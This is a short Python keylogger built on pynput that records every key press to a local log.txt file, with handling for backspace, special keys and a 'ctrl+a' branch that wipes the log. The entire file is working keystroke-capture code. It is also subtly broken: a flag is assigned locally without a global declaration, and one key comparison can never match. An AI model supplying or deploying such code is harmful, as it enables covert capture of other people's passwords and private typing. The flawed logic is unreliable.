from pynput.keyboard import Listener, Key

is_blocked = False

def writetofile(key):
    letter = str(key)
    # key replace
    letter = letter.replace("'","")
    letter = letter.replace("Key.enter","\n")
    letter = letter.replace("Key.space"," ")
    letter = letter.replace("Key.tab","\t")
    # letter = letter.replace("Key.ctrl", "")
    letter = letter.replace("Key.ctrls ","")
    letter = letter.replace("Key.alt","")
    letter = letter.replace("Key.shift ","")

    # ctrl+a logic
    if letter == "Key.ctrla":
        is_blocked = True
        print (" (user blocked all characters) ")
        return

    if is_blocked:
        with open("log.txt", "w") as file:
            file.write("")
        is_blocked = False
        if letter == "Key.backspace":
            letter = ""
        return
    # backspace logic
    if letter == "Key.backspace":
        try:
            with open("log.txt","r") as file:
                fileContent = file.read()
            with open("log.txt","w") as file:
                file.write(fileContent[:-1])

        except FileNotFoundError:
            pass
        letter = ""


    # creating the file for the keystroke
    with open("log.txt","a") as file:
        file.write(letter)

with Listener(on_press = writetofile) as l:
    l.join()







